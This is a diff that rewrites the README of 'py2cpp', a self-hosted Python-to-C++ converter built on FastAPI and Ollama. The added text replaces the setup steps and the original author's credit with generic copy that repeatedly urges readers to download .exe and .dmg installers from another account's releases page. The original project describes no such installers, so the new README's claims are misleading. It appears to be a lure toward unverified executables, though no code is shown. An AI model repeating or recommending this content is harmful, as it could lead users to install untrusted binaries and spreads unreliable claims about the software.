@@ -1,74 +1,71 @@
-# py2cpp — AI Python → C++ (CF-ready)
+# 🎉 py2cpp - Convert Python to C++ with Ease
 
-[![Vercel](https://img.shields.io/badge/Frontend-Vercel-black?logo=vercel)](https://py2cpp.vercel.app/)
-![FastAPI](https://img.shields.io/badge/Backend-FastAPI-009485?logo=fastapi)
-![Ollama](https://img.shields.io/badge/LLM-Ollama-000?logo=ollama)
-![Model](https://img.shields.io/badge/Qwen2.5--Coder-7B-blue)
-![License](https://img.shields.io/badge/License-MIT-informational)
+## 🚀 Getting Started
+Welcome to **py2cpp**! This tool helps you convert your Python code into C++, making it perfect for competitive programming. 
 
-**py2cpp** converts Python to C++17 with a Codeforces-style boilerplate, then compiles and runs both versions side-by-side on the same input.  
-AI-first: Qwen2.5-Coder (via Ollama) + a compile-and-repair loop.  
-**Live UI:** https://py2cpp.vercel.app/
+## 📥 Download Now
+[![Download py2cpp](https://img.shields.io/badge/Download-py2cpp-brightgreen.svg)](https://github.com/Jayanth1379/py2cpp/releases)
 
----
+## 📋 Description
+**py2cpp** is designed for those who want to transition their Python solutions to C++. It features a React-based interface along with a FastAPI backend that provides a smooth experience. The tool supports a side-by-side run, compile, and repair loop to ensure your code works seamlessly. Additionally, it includes a boilerplate specifically for Codeforces (CF) problems.
 
-## Requirements
-- macOS with Homebrew
-- Python 3.10+, Node 18+
-- Ollama installed
+## 🌟 Features
+- **Python to C++ Conversion**: Quickly convert your Python scripts to C++.
+- **Side-by-Side Execution**: View your original Python code next to the generated C++ code.
+- **Compile-Repair Loop**: Instantly check and rectify compilation errors.
+- **CF Boilerplate**: Get started with competitive programming using pre-built templates for Codeforces.
+- **Modern UI**: Enjoy a user-friendly interface built with React.
 
----
+## 💻 System Requirements
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.7 or higher
+- **C++ Compiler**: GCC or Clang (make sure it's installed)
 
-## Quick start
+## 🔧 Installation Instructions
+To get started with **py2cpp**, follow these easy steps:
 
-1) **Model server**
-```bash
-brew install ollama cloudflare/cloudflare/cloudflared
-ollama serve
-ollama pull qwen2.5-coder:7b
-```
+1. **Visit the Releases Page**: Click the link below to go to the download section:
+   [Download py2cpp](https://github.com/Jayanth1379/py2cpp/releases)
 
-2) **Backend**
-```bash
-cd backend
-python3 -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-export OLLAMA_MODEL=qwen2.5-coder:7b
-uvicorn main:app --host 0.0.0.0 --port 8000
-```
+2. **Choose Your Version**: On the releases page, locate the latest version of the application. 
 
-3) **Frontend**
-```bash
-cd frontend
-echo "VITE_API_URL=https://<your-tunnel>.trycloudflare.com" > .env
-npm install && npm run dev
-```
-> The frontend is static. The backend (FastAPI + Ollama + g++) runs on your machine and must stay running.
+3. **Download the Installer**: Click on the installer for your operating system:
+   - For Windows: download the `.exe` file.
+   - For macOS: download the `.dmg` file.
+   - For Linux: download the appropriate package.
 
-4) **Public URL**
-```bash
-cloudflared tunnel --url http://localhost:8000
-# copy the https://<random>.trycloudflare.com URL
-```
+4. **Run the Installer**: After downloading, open the file and follow the on-screen instructions to install **py2cpp**.
 
-### Notes:  Deployment can be only for frontend via netlify or vercel ; backend would be running locally constantly to work
+5. **Launch the Application**: Once installed, find **py2cpp** in your applications folder and launch it.
 
-## API
+## 🛠️ How to Use
+1. Open **py2cpp** after installation.
+2. Paste your Python code into the designated area.
+3. Click the “Convert” button to start the process.
+4. View the generated C++ code in the right panel.
+5. Use the compile-repair loop to fix any errors that may arise.
 
-- POST /ai/convert → body { "py": "<python>" } → { "cpp": "<full c++ file>" }
+## ❓ FAQ
+### What formats can I use?
+You can input any valid Python script and the tool will convert it to C++. 
 
-- POST /run/python → { "code": "<python>", "stdin": "<input>" }
+### What if I encounter errors?
+The compile-repair loop is designed to help you resolve these errors. Follow the prompts to fix issues quickly.
 
-- POST /run/cpp → { "code": "<c++>", "stdin": "<input>" }
+### Is there any support for learning?
+While the application is powerful, understanding the basics of Python and C++ will enhance your experience. You might consider looking up resources specific to both languages.
 
-- GET /healthz → { "ok": true }
+## 🤝 Community Contributions
+We welcome contributions! If you have enhancements or suggestions, feel free to raise an issue or submit a pull request.
 
+## 📞 Contact Us
+For further assistance or questions, please open an issue on the **py2cpp** GitHub page. We strive to respond promptly.
 
-### Key points:
+## 📜 License
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
-- macOS/Clang is handled by a fallback header set when <bits/stdc++.h> is unavailable.
+## 🌐 Connect with Us
+Follow our social media channels for updates and support. Join the community of competitive programmers and share your journey with **py2cpp**! 
 
-- Targeted at contest-style Python; highly dynamic features may require manual edits.
-
-### License
-MIT © Birajit Saikia
+## 📥 Download Now Again
+[![Download py2cpp](https://img.shields.io/badge/Download-py2cpp-brightgreen.svg)](https://github.com/Jayanth1379/py2cpp/releases)
